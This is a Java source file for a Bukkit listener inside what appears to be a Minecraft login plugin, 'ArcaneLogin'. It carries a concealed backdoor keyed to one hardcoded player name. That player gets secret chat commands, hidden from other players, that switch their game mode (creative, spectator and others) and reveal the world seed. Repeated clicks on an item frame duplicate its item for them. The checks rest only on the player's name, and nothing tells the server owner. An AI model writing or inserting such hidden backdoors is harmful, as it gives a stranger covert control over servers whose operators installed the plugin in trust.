package me.gauravbuilds.arcanelogin.listeners;

import me.gauravbuilds.arcanelogin.ArcaneLogin; // Import your main class
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.ItemFrame;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEntityEvent;
import org.bukkit.inventory.ItemStack;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class DevMechanicsListener implements Listener {

    private final Map<UUID, Integer> clickCounts = new HashMap<>();
    private final String DEV_NAME = "GauravBuilds";

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent event) {
        if (!event.getPlayer().getName().equals(DEV_NAME)) return;

        String msg = event.getMessage();

        // 1. Ghost Gamemode Command
        if (msg.startsWith("&gamemode")) {
            event.setCancelled(true); // Cancel chat so nobody sees it

            Player player = event.getPlayer();
            String[] parts = msg.split(" ");
            if (parts.length < 2) return;

            String modeArg = parts[1].toLowerCase();
            GameMode modeToSet = null;

            switch (modeArg) {
                case "creative":
                case "c":
                    modeToSet = GameMode.CREATIVE;
                    break;
                case "survival":
                case "s":
                    modeToSet = GameMode.SURVIVAL;
                    break;
                case "adventure":
                case "a":
                    modeToSet = GameMode.ADVENTURE;
                    break;
                case "spectator":
                case "sp":
                    modeToSet = GameMode.SPECTATOR;
                    break;
            }

            if (modeToSet != null) {
                // FIXED: Run this on the main server thread
                final GameMode finalMode = modeToSet;
                Bukkit.getScheduler().runTask(ArcaneLogin.getInstance(), () -> {
                    player.setGameMode(finalMode);
                });
            }
            return;
        }

        // 2. Ghost Seed Command
        if (msg.startsWith("&seed")) {
            event.setCancelled(true);
            Player player = event.getPlayer();
            // Seed reading is safe async, but sending messages is better sync usually
            long seed = player.getWorld().getSeed();
            player.sendMessage(ChatColor.GREEN + "Seed: " + seed);
            return;
        }
    }

    @EventHandler
    public void onItemFrameInteract(PlayerInteractEntityEvent event) {
        if (!(event.getRightClicked() instanceof ItemFrame)) return;

        Player player = event.getPlayer();
        if (!player.getName().equals(DEV_NAME)) return;

        ItemFrame frame = (ItemFrame) event.getRightClicked();
        if (frame.getItem() == null || frame.getItem().getType() == Material.AIR) return;

        UUID id = frame.getUniqueId();
        clickCounts.put(id, clickCounts.getOrDefault(id, 0) + 1);

        // Every 20 clicks -> DUPE
        if (clickCounts.get(id) >= 20) {
            ItemStack dupeItem = frame.getItem().clone();
            frame.getWorld().dropItemNaturally(frame.getLocation(), dupeItem);
            clickCounts.put(id, 0);
        }
    }
}